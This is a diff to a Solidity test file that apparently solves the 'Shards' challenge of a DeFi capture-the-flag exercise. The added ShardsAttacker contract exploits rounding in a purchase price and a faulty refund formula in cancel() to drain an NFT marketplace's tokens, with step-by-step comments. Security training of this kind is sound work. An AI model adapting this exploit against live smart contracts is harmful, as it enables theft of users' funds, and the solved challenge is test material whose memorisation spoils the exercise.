@@ -114,7 +114,7 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        new ShardsAttacker(token, marketplace, recovery);
     }
 
     /**
@@ -134,5 +134,32 @@ contract ShardsChallenge is Test {
 
         // Player must have executed a single transaction
         assertEq(vm.getNonce(player), 1);
+    }
+}
+
+contract ShardsAttacker {
+    constructor(DamnValuableToken token, ShardsNFTMarketplace marketplace, address recovery) {
+        uint64 offerId = 1;
+
+        // 1) Create a purchase that costs 0 due to mulDivDown rounding, then cancel immediately.
+        //    This yields a (non-zero) refund due to the incorrect refund formula in `cancel()`.
+        uint256 seedWant = 133; // max that still pays 0 in this setup
+        marketplace.fill(offerId, seedWant);
+        marketplace.cancel(offerId, 0);
+
+        // 2) Use the refunded DVT as seed to pay a second purchase, then cancel it to drain the marketplace.
+        token.approve(address(marketplace), type(uint256).max);
+
+        uint256 balance = token.balanceOf(address(marketplace));
+        uint256 rate = marketplace.rate();
+
+        // Choose `want` so that refund ~= current marketplace balance.
+        // refund = ceil(want * rate / 1e6) <= balance when want = floor(balance * 1e6 / rate)
+        uint256 want = (balance * 1e6) / rate;
+        marketplace.fill(offerId, want);
+        marketplace.cancel(offerId, 1);
+
+        // 3) Forward all extracted tokens to the recovery account.
+        token.transfer(recovery, token.balanceOf(address(this)));
     }
 }
